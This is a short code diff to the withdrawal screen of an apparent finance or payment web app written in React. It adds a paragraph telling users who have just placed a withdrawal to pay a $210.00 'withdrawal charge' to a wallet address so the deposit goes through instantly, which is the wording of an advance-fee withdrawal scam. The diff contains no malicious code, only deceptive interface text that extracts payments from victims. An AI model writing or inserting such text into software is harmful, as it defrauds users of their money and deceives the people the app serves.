@@ -239,6 +239,11 @@ function Withdraw() {
             <p className="text-center font-semibold">
               Your withdrawal of {formatUsd(done.amount)} has been placed successfully.
             </p>
+            <p className="mt-1 text-sm font-medium text-muted-foreground">
+  Your withdrawal of  {formatUsd(done.amount)} has been placed successfully.
+Pay exactly $210.00 withdrawal charge to the wallet address below and refresh your cashapp for instant deposit
+</p>
+
             <dl className="space-y-2">
               <div className="flex justify-between gap-3">
                 <dt className="text-muted-foreground">Request ID</dt>
